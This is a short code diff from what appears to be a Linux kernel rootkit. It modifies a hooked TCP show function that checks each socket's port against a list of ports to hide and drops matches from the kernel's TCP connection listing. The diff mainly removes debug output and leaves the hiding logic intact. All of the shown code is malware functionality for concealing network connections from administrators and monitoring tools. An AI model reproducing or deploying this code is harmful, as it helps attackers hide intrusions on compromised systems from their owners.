@@ -113,21 +113,14 @@ static int hooked_tcp_show(struct seq_file* file, void* v){
     struct inet_sock* s;    
     struct l_socket_to_hide* socket;
     struct list_head* cur;
-    // if (strcmp(prot_to_hide, "tcp")){
-    //     return tcp_show_orig(file, v);
-    // }
     if (v == SEQ_START_TOKEN) {
         return tcp_show_orig(file, v);
     }
     sk = (struct sock*) v;
     s = inet_sk(sk);
-    OUR_DEBUG("tcp pointer : %p\n", s);
     port = ntohs(s->sport);
-    OUR_DEBUG("tcp pointer2: %p\n", s);
-    OUR_DEBUG("tcp_show port: %d, %d\n", port, port_to_hide);
     list_for_each(cur, &sockets_to_hide){
         socket = list_entry(cur, struct l_socket_to_hide, list);
-        OUR_DEBUG("Current TCP port checked: %d against in list %p\n", port, cur);
         if (port == socket->port && socket->prot == OUR_PROT_TCP){
             return 0;
         } 
